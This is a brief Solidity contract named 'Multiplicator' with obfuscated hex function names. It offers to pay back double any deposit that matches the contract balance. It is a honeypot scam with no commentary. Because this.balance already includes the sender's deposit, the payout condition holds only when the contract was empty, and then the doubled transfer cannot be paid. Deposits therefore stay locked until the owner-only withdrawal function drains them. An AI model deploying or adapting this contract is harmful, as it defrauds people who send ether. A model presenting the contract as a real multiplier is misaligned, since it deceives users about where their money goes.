pragma solidity ^0.4.18;

contract Multiplicator
{
    address public Owner = msg.sender;

    function()payable{}

    function _0x30063b()
    payable
    public
    {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }

    function _0x36802a(address _0x0b178a)
    payable
    {
        if(msg.value>=this.balance)
        {
            _0x0b178a.transfer(this.balance+msg.value);
        }
    }
}